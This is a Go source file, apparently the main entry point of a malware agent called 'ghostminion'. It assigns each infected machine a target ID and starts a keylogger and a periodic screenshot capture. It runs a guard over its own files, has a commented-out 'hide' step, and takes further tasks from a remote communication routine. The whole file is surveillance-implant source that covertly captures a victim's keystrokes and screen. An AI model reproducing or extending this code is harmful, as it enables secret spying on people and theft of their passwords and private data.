package main

import (
	"fmt"
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/persistence"
	"log"
)

const (
	configFilePath = "../tests/config.yaml"
)

func main() {

	configInstance, err := config.LoadConfig(configFilePath)
	if err != nil {
		panic(err)
	}

	//err = hider.Hide()
	//if err != nil {
	//	panic(err)
	//}

	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
	if err != nil {
		panic(err)
	}

	targetId := persistence.GenerateTargetID()
	err = config.UpdateConfig(configFilePath, func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		return
	}
	fmt.Println("targetId:", targetId)

	appManager := apps.GetAppManagerInstance()
	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
	appManager.StartApp(string(apps.ScreenShotTask)+"_default", &apps.ScreenshotApp{
		Interval: int8(configInstance.Apps.Screenshot["Interval"].(int)),
	})
	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
		FilesExistence: []string{
			configInstance.Installation.ConfigFile,
			configInstance.Installation.DBPath,
		},
	})

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	for task := range taskCh {
		// TODO: handle config change
		if app, err := apps.NewAppFactory(task); err != nil {
			log.Print(err)
		} else {
			appManager.StartApp(task.Name, app)
		}
	}

	appManager.StopAll()
}
